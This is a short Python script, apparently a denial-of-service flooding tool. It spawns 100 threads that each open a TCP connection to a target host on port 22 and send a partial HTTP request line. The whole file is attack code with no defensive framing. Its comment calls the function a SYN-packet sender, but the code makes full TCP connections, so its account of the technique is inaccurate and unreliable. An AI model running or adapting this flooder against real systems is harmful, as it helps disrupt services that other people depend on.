import socket
import threading

# Target IP and port
target_ip = "example.com"
target_port = 22

# Function to send SYN packets
def flood():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        sock.send(b'GET / HTTP/1.1\r\n')
    except Exception as e:
        print(f"Error: {e}")

# Launch threads for flooding
threads = []
for _ in range(100):  # Number of threads
    thread = threading.Thread(target=flood)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()
